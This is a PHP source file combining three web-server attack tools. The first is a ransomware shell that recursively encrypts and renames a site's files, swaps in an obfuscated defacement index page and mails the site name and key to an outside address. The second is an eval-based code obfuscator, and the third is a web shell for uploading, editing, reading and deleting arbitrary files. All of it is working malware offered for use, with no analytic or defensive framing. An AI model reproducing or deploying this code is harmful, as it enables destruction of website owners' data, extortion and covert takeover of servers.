<!DOCTYPE html>
<html>
<head>
   <title>RANSOMWARE MINI SHELL</title>
<style type="text/css">
body {
    background: #1A1C1F;
    color: #e2e2e2;
}
.inpute{
    border-style: dotted;
    border-color: #379600;
    background-color: transparent;
    color: white;
    text-align: center;
}
.selecte{
    border-style: dotted;
    border-color: green;
    background-color: transparent;
    color: green;
}
.submite{
       border-style: dotted;
    border-color: #4CAF50;
    background-color: transparent;
    color: white;
}
.result{
  text-align: left;
}
</style>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css">
</head>
<body>
<div class="result">
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
class deRanSomeware
{
   public function shcpackInstall(){
    if(!file_exists(".htaFuck")){
      rename(".htaccess", ".htaFuck");
      if(fwrite(fopen('.htaccess', 'w'), "#5H311_1NJ3C706\r\nDirectoryIndex index.php\r\nErrorDocument 404 /index.php")){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
      }
      if(file_put_contents("index.php", base64_decode("PGh0bWw+CjxoZWFkPgo8L2hlYWQ+Cjxib2R5PgoKPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgo8IS0tIApldmFsKHVuZXNjYXBlKCclNjYlNzUlNmUlNjMlNzQlNjklNmYlNmUlMjAlNzUlNjMlMzYlMzQlMzElMzglMzAlNjUlMjglNzMlMjklMjAlN2IlMGElMDklNzYlNjElNzIlMjAlNzIlMjAlM2QlMjAlMjIlMjIlM2IlMGElMDklNzYlNjElNzIlMjAlNzQlNmQlNzAlMjAlM2QlMjAlNzMlMmUlNzMlNzAlNmMlNjklNzQlMjglMjIlMzElMzUlMzUlMzElMzIlMzklMzQlMzQlMjIlMjklM2IlMGElMDklNzMlMjAlM2QlMjAlNzUlNmUlNjUlNzMlNjMlNjElNzAlNjUlMjglNzQlNmQlNzAlNWIlMzAlNWQlMjklM2IlMGElMDklNmIlMjAlM2QlMjAlNzUlNmUlNjUlNzMlNjMlNjElNzAlNjUlMjglNzQlNmQlNzAlNWIlMzElNWQlMjAlMmIlMjAlMjIlMzclMzUlMzQlMzglMzklMzElMjIlMjklM2IlMGElMDklNjYlNmYlNzIlMjglMjAlNzYlNjElNzIlMjAlNjklMjAlM2QlMjAlMzAlM2IlMjAlNjklMjAlM2MlMjAlNzMlMmUlNmMlNjUlNmUlNjclNzQlNjglM2IlMjAlNjklMmIlMmIlMjklMjAlN2IlMGElMDklMDklNzIlMjAlMmIlM2QlMjAlNTMlNzQlNzIlNjklNmUlNjclMmUlNjYlNzIlNmYlNmQlNDMlNjglNjElNzIlNDMlNmYlNjQlNjUlMjglMjglNzAlNjElNzIlNzMlNjUlNDklNmUlNzQlMjglNmIlMmUlNjMlNjglNjElNzIlNDElNzQlMjglNjklMjUlNmIlMmUlNmMlNjUlNmUlNjclNzQlNjglMjklMjklNWUlNzMlMmUlNjMlNjglNjElNzIlNDMlNmYlNjQlNjUlNDElNzQlMjglNjklMjklMjklMmIlMmQlMzglMjklM2IlMGElMDklN2QlMGElMDklNzIlNjUlNzQlNzUlNzIlNmUlMjAlNzIlM2IlMGElN2QlMGEnKSk7CmV2YWwodW5lc2NhcGUoJyU2NCU2ZiU2MyU3NSU2ZCU2NSU2ZSU3NCUyZSU3NyU3MiU2OSU3NCU2NSUyOCU3NSU2MyUzNiUzNCUzMSUzOCUzMCU2NSUyOCUyNycpICsgJyU0MyU3MyU3ZSU3MCU3NSU0MCU0YyU3NyU2OCU2ZCU2NCU0ZiU0NSU3YiU3MiU3ZSU3MSU2YyU0MCU0NSU3MSU2ZSU3ZSU4OSU3MSU3ZCU2YSU2ZiUyYSU0YiU3MCU3MiU2NSU3YyUyZCU1YiU2NSU2MyU3YSU3NiU3ZiU2ZiU0MSUzNiU3YSU3OSU3YiU3MSU2OSU0ZSU0ZCU2YiU3MCU2ZiU4MyUyZCU2YiU2OSU2MyU3MCU3MSU3MyU3MiU0YyU2YiU3MyU2YSU2OSU3NiU0NyU0MiU2MyU2YSU3MyU3OCU2NSU3MyU0NyU0MyU3ZiU2YiU2ZiU3NSU2YiUyMCU2ZCU2YSU2ZiU3ZiU3ZCU3NiU3ZCU0NiUyOSU0OSUzOSU0YSUzMCU0YiUzZCUyYyU2MiU3ZSU3YiU2YiU2ZSU3OCU0MCUzOCUzZSU3MCU4NyU0MyU0MCU3NCU3MyU0NyU0MyU3ZiU2ZSU0MyU0NSU2ZCU2NSU3MSU3OSU2OSU3MiU0ZiU0NSU3NyUzYSU0NCUyYyUyOCUyZiUyMCU2NiU1MiU1OSU1MiUyMSU0ZiU1NiU1NyU0ZiU1ZSUyOSU1NiU0MSU1OSU0OCUyYyU0MiU0NCU0YyU1MSUyYiU0ZiU1MyU0YSU1YyU2OSU1ZiU1OSU0OSU0NCUyMSU1ZSU1NiU1ZiU1MiUyZCU1YiU0ZiU1ZSU1YyU1MiU1MSU1NyU0MCU1YiU0YSUyYiUyYiUyYyUyOCU0MiUzZiU3NyUzYyU0MiU0YyU3MSU0NyU0MyU3MyUzYiU0MyU0NSU3YiU0ZSU0MyU2YiU3MyU3ZSU3NSUyOSU2YyU3NCU3NiU3MiU3YiU0MyU3MiU2YSU2OSU0MiUyMCU1NSU3MSU2YSUyYiU1MSU2OCU4MCUyZSU3NCU3MCUyZCU0OCU2NSU2MiU3YiU4NiU3YiU3ZSUyZCU2MCU3MSU3NSU3ZCUyZCU0YSU3OSU3ZCU2YyU3YyUyYiU1ZCU3NCU3NSU3MiUyMCU0ZCU2OCUyYyU0NCU0NCU1NSU0YSU1ZiU0ZiU0OSUyOSU3NyU3ZSUyZiUzYSUyYyU0NCU2MCU4MCU3YyU0NyUzNSU2YiU3NiU3MCU3NCU0MSU0MSUzMyU3NSU0ZiU0NSUzMCU3MyUzYiU0MyU0NSU3ZSU0ZSUyOSU3MyU2ZSU3MyU3MSU0MiU0MyU3YiU0NCUyZCU0NSU3NiUzMSU0MSU1ZSU2OSU3ZSU2NSUyOSU1MiU2ZSUyYSU0MSU3YyU0MCUzMCUzMSUzZSUyYyU0MiU3OCU3ZCU2YyU3NCU3MyU3MyU3YSU0MiUzZiU3YSU0MyUyYyUzOCU0ZCU2ZiU3MCU3NSU3ZSUyZCU2YSU3MSU3YyU3MCU3ZiU0MSU3MiU2NCU2ZCU0MSU2MiU3NSU3OCUyOSU1NiU2MSU3OSU2OCUyYyU1ZiU3ZiU3NSU4NiUyYiUzZCUyZCU0ZCU2ZiU4OSU3YyUyZCU0YSU3MiU3ZSU3NCUyZiU1NSU3NSU3YSU0NSUzMSU2NiU3MCU3MyU3OCU0ZSUzOCU0NSUzMCU3MyUzYiU0MyU0NSU3ZSU0ZSUyZiU0MSU3NCUzMSU0ZiU0NSU3YSU0NSU0OCU3NCU3ZCU2ZCU3ZiU3NiU3MyUyYyU0MSU2NSU2ZCU3ZCU2ZSU3OSU3ZSU0NSUzMSU3NSU0MSU0NyUyYyUzMSU0MyU0ZCU0YyU3OCU1ZSU3OSU3ZCU0YyU3OSU0OCU1MCUzYiU0OSU3OSU0YiU1NCU0MiU3OSU3YiU0ZSUzOSU3ZSU0YSU3NCUzOCUzNyU2NCU2OCU1MiU0OSU2YiU1YyU2OCU0MiUzZiU3NyUzYyU0MiU0YyU3MSU0NyUyZiU0NyU3ZSU2YyU2YiU3MiU2NSUyZiU2ZiU3MyU3MiU2NSU2YyU3ZCU0NiUzYSU0MyU0NSU3YSU3MiU0MSU0MSU3OCU2NCU0ZiU0NSU3NyUzOCU0NCU0MSU2YiU0MCU0YyU3NyUzYyU0MiU0YyUzZSU3MSUzYyU0NSU0NiUzMiU3ZCU2YSU0ZSU0MyUzMiU3OCU3MiU0ZiU0NSUzMCU3ZiU2YiU2ZiU3NSU2YiU0ZSU0MyU3ZCU0MiUyMCU0ZCU3MSUzZSU0NSU1OSU2OCU3NyU2YSUyMCU1ZiU3ZiU3MyU3ZiU2NyUyOSU3MCU2ZCUyYSU1ZCU2OCU4NyU3ZCU2YSU3MyU3OCUyMCU1NSU3YiU2ZSU3NSU3OSU2YyU2YSU3YSU3OSU3MCU3MyU3ZiUyMCU3NyU3MCU2ZSUyYiU0ZiU3MCU2OCU3NyU3YyU0NSUyZCU0MCU3MCU0ZiUyOSU0MyU3MiU0NCU1NSU2OCU2ZCU3YiU2YSU3ZiU0ZSU2MSU3ZCU3NiU2YyU3MyUzYSUzYSU0OSU2OSU3ZCU2ZSU3NCU3MCUzZSU2MiU3NiU3MiU0NyUzNSU3NCU0NyU0MiUzZiU3NyUzYyU0MiU0YyU3MSU0NyU0MyU3MyUzYiU0MyU1MCUyZSU1NyU3NiU3MSU3MCUyMCU1MiU2YyU3MSU2ZiUyYSU2NCU3NiU3YiUyMCU3YiU3NSU2OSUyMCU1YSU2YyU4NiUyYiU3ZSU3MiUyOSU0YSU2NSU2YyU3ZiU4NSU3MCU3NSUyOSU2NiU3NCU3ZiU3ZiUyOSU0OCU3OSU3MyU2OCU3ZiU0YyUzZSU3MSUzZSU0NSU0NiUzMiU2YSU2YiU3ZSU3YiU2OCU3ZSU0ZSU0ZCUzNiU3YiU2ZiU0NCU0MSUzNiU3YSU3MiU0MSU0MSUzMyU2MiU3ZSU2ZCU4NiU0NSU0NiUzMiU3MSU3YSU3ZCU3MyU0MzE1NTEyOTQ0JTM3JTMzJTMyJTM1JTMxJTM2JTM4JyArIHVuZXNjYXBlKCclMjclMjklMjklM2InKSk7Ci8vIC0tPgo8L3NjcmlwdD4KPG5vc2NyaXB0PjxpPkphdmFzY3JpcHQgcmVxdWlyZWQ8L2k+PC9ub3NjcmlwdD4KCjwvaHRtbD4="))){
            echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i>  index.php (Default Page)<br>';
      }
    }
   }
   public function shcpackUnstall(){

      if( file_exists(".htaFuck") ){
        if( unlink(".htaccess") && unlink("index.php") ){
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> .htaccess (Default Page)<br>';
          echo '<i class="fa fa-thumbs-o-down" aria-hidden="true"></i> index.php (Default Page)<br>';
        }
        rename(".htaFuck", ".htaccess");
      }

   }

   public function plus(){
      flush();
      ob_flush();
   }
   public function locate(){
        return getcwd();
    }
   public function shcdirs($dir,$method,$key){
        switch ($method) {
          case '1':
            deRanSomeware::shcpackInstall();
          break;
          case '2':
           deRanSomeware::shcpackUnstall();
          break;
        }
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $locate = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($locate)){
                   if(  deRanSomeware::kecuali($locate,"ransmini.php")  && deRanSomeware::kecuali($locate,".pnjg")  && deRanSomeware::kecuali($locate,".htaccess")  && deRanSomeware::kecuali($locate,"index.php") &&  deRanSomeware::kecuali($locate,"indehx.php") && deRanSomeware::kecuali($locate,".htalol") ){
                     switch ($method) {
                        case '1':
                           deRanSomeware::shcEnCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"1");
                        break;
                        case '2':
                           deRanSomeware::shcDeCry($key,$locate);
                           deRanSomeware::shcEnDesDirS($locate,"2");
                        break;
                     }
                   }
                }else{
                  deRanSomeware::shcdirs($locate,$method,$key);
                }
            }
            deRanSomeware::plus();
        }
        deRanSomeware::report($key);
   }

   public function report($key){
        $message.= "=========    Ransomware Mini Shell    =========\n";
        $message.= "Website : ".$_SERVER['HTTP_HOST'];
        $message.= "Key     : ".$key;
        $message.= "========= Ransomware Mini Logger =========\n";
        $subject = "Report Ransomeware";
        $headers = "From: Tuyul <HackerBaloch07@gmail.com>\r\n";
        mail("HackerBaloch07@gmail.com",$subject,$message,$headers);
   }

   public function shcEnDesDirS($locate,$method){
      switch ($method) {
        case '1':
          rename($locate, $locate.".5H311_1NJ3C706");
        break;
        case '2':
          $locates = str_replace(".5H311_1NJ3C706", "", $locate);
          rename($locate, $locates);
        break;
      }
   }

   public function shcEnCry($key,$locate){
      $data = file_get_contents($locate);
      $iv = mcrypt_create_iv(
          mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC),
          MCRYPT_DEV_URANDOM
      );

      $encrypted = base64_encode(
          $iv .
          mcrypt_encrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              $data,
              MCRYPT_MODE_CBC,
              $iv
          )
      );
      if(file_put_contents($locate,  $encrypted )){
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Encrypted</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-lock" aria-hidden="true"></i> <font color="#00BCD4">Encrypted</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> '.$locate.' <br>';
      }
   }

   public function shcDeCry($key,$locate){
      $data = base64_decode( file_get_contents($locate) );
      $iv = substr($data, 0, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));

      $decrypted = rtrim(
          mcrypt_decrypt(
              MCRYPT_RIJNDAEL_128,
              hash('sha256', $key, true),
              substr($data, mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC)),
              MCRYPT_MODE_CBC,
              $iv
          ),
          "\0"
      );
      if(file_put_contents($locate,  $decrypted )){
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Decrypted</font> (<font color="#40CE08">Success</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }else{
         echo '<i class="fa fa-unlock" aria-hidden="true"></i> <font color="#FFEB3B">Decrypted</font> (<font color="red">Failed</font>) <font color="#FF9800">|</font> <font color="#2196F3">'.$locate.'</font> <br>';
      }
   }



   public function kecuali($ext,$name){
        $re = "/({$name})/";
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }
}

if($_POST['submit']){
switch ($_POST['method']) {
   case '1':
      deRanSomeware::shcdirs(deRanSomeware::locate(),"1",$_POST['key']);
   break;
   case '2':
     deRanSomeware::shcdirs(deRanSomeware::locate(),"2",$_POST['key']);
   break;
}
}else{
?>
<center>
<div style='font-size;color:Chartreuse;'>

<pre>
@@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@

</pre>
<form action="" method="post" style=" text-align: center;">
      <label>Key : </label>
      <input type="text" name="key" class="inpute" placeholder="Password Key">
      <select name="method" class="selecte">
         <option value="1">Locked</option>
         <option value="2">Unlocked</option>
      </select>
      <input type="submit" name="submit" class="submite" value="Submit" />
</form>

<?php
}?>

<br><br><br>

<hr>
 </center>
 </div>
</html>

<!DOCTYPE html>
<html lang="en">
    <head>


        <style>
    body {
                background-color: black;
            }
            body {
                color: red;
                font-size: 100%;
                font-weight: bold;
                font-family: Courier;

                background-color: black;
            }
input {
    color: red;
                color: red;
                font-size: 100%;
                font-weight: bold;
                font-family: Courier;
                border: 2px solid red;
    border-radius: 4px;
                background-color: black;





}
textarea {
                color: red;
                font-size: 100%;
                font-weight: bold;
                font-family: Courier;
                border: 2px solid red;
    border-radius: 4px;
                background-color: black;
            }
#content tr:hover{
                            background-color: black;
                            text-shadow:0px 0px 10px red;
                        }
                        #content .first{
                            background-color: black;
                        }


                        a{
                            color: red;
                            text-decoration: none;
                        }

    </style>
    </head>

    <body>
        <div class="heading">
        <font><center><h1>Obfuscator By 5H311_1NJ3C706</h1></center></font>
        </div>
        <div class="subheading">
        <center>    <h3><font></font></h3></center>
        </div>
        <div class="input">
            <form action="" method="POST">
            <center>    <textarea rows="9" cols="85" type="text" name="php" placeholder="Input Php Code Here"></textarea><br><br>
                </center>
            <center>    <input type="submit" name="submit" value="Submit" /><br>
                </center>
                <?php
                    if (isset($_POST['submit'])) {
                    $phpcode = $_POST['php'];
                        if (!empty($phpcode)) {

                            $website = "http://".$_SERVER['HTTP_HOST'];
                            $file_location = htmlspecialchars($_SERVER['REQUEST_URI']);
                            $all_in_one = $website.$file_location;





                                $obfuscate_high_level = strrev(base64_encode(gzdeflate(gzdeflate(gzdeflate(gzcompress(gzcompress($phpcode)))))));
                                        echo '<textarea rows="9" cols="85">
<?php
/*
                               This Code Was Successfully Encrypted By 5H311_1NJ3C706
                          Contact Email : HackerBaloch07@gmail.com
                        https://darknet-cyber.blogspot.com/
                         ####### TROJAN_CYBER_SECURITY #######
*/
$Cyber = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNENyaW1lJTI5JTI5JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
$Crime = "'.$obfuscate_high_level.'";
eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
exit;
?></textarea>
';

                            }
                        }

                ?>
            </center>
            </form>
        </div>
        <div class="footer">

        </div>
    </body>
</html>

   <?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link href="" rel="stylesheet" type="text/css">
<title>5H311_1NJ3C706</title>
<style>
body{
font-family: "Courgette", cursive;
    background-image: url(" ");
    color:red;
    background-attachment:fixed;
    background-repeat:no-repeat;
    background-position:center;
    background-color:Black;
    -webkit-background-size: 100% 100%;
}
h1{
color:red;
-webkit-text-stroke: 0px #5ddcfc;
}
#content tr:hover{
background-color:  #5ddcfc;
text-shadow:1px 1px 0px #000;
}
#content .first{
color:red;
background-color: #5ddcfc;
}
table{
border: 0px #9435dd solid;
}
a{
color:Lime;
text-decoration: none;
}
a:hover{
color:#9435dd;
text-shadow:0px 1px 0px #000;
}
input,select,textarea{
font-family: Courgette;
background-color:black;
color:#5ddcfc;
border: 1px red solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;

}
</style>
</head>
<body>
<link href="https://fonts.googleapis.com/css?family=Courgette" rel="stylesheet">
<center>
<h1>RANSOM MINI SHELL</h1></center>
<table width="700" border="0" cellpadding="4" cellspacing="1"align="center">
<tr><td><font color="#7fff00">Current Dir :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#5ddcfc">Ngentot Memek Berhasil</font><br />';
}else{
echo '<font color="#9435dd">Ngentot Memek Gagal</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="#5ddcfc">File Upload :</font><input type="file"  name="file" /><input type="submit" value="Fire" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo(' <center><textarea style="width: 700px;height: 300px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea></center>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#5ddcfc">Change Permission Berhasil</font><br/>';
}else{
echo '<font color="#9435dd">Change Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#5ddcfc">Berhasil Mengganti Nama</font><br/>';
}else{
echo '<font color="#9435dd">Gagal Mengganti Nama</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
Nama Baru : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Simpan" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#5ddcfc">Berhasil Edit File</font><br/>';
}else{
echo '<font color="#9435dd">Gagal Edit File</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<center><textarea style="width: 700px;height: 300px;" name="src"> '.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea></center><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Simpan" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#5ddcfc">Directory Berhasil Terhapus</font><br/>';
}else{
echo '<font color="#9435dd">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#5ddcfc">File Berhasil Terhapus</font><br/>';
}else{
echo '<font color="#9435dd">File Gagal Dihapus</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="4" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</peller></center></td>
<td><center>Size</peller></center></td>
<td><center>Permission</peller></center></td>
<td><center>Modify</peller></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>----</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color=" #00ff00">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="Lime">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color=" #00edff">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/> </center>
<center><font color="red" face="Courgette" size="4">Copyright &copy; 2020 <font color="#00ff00">5H311_1NJ3C706</font></center>
<body>

    <iframe width="0" height="0" src="https://5.top4top.net/m_1334ihpla0.mp3" frameborder="0" allowfullscreen></iframe>

</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
